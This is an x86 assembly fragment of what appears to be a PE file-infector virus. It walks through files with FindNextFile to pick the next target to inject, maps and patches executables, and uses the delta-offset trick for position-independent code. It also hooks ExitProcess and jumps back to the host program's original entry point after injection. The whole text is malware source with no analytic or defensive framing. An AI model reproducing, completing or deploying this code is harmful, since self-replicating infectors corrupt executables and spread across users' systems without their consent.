; MANAGE ALL KINDS OF ERRORS !
errorInjecting:
PVDELTA	PeFileMap
call	[DELTA pUnmapViewOfFile]

errorMapFile:
PVDELTA	PeMapObject
call	[DELTA pCloseHandle]

errorCreateMapping:
PVDELTA	PeFile
call	[DELTA pCloseHandle]

; TO THIS POINT WE GET THE NEXT FILE (IF POSSIBLE)
errorOpen:
PDELTA	FileData
PVDELTA	HandleSearch
call	[DELTA pFindNextFile]
cmp	eax, 0
je	errorExit
jmp	nextFileToInject

; Wait for thread old program and exit
errorExit:
push	INFINITE
PVDELTA	ThreadHandle
call	[DELTA pWaitForSingleObject]
push	0
call	[DELTA pExitProcess]

; Jump to old entry point (Overrided when injecting)
threadProgram:
pop	edx ; Retrieve return from thread
call	getOffsetEip
mov	[DELTA RetFromThread], edx
goToEntryPoint:
ret ; By default it exit our thread
nop
nop
nop
nop

hook_exitprocess:
call	getOffsetEip
mov	eax, [DELTA RetFromThread]
push	eax
ret	; Thread return

getOffsetEip:
call	delta
delta:
pop	eax ; Retrieve eip
mov	ebp, eax
sub	ebp, delta ; Ebp + Label to get the data in thread
ret
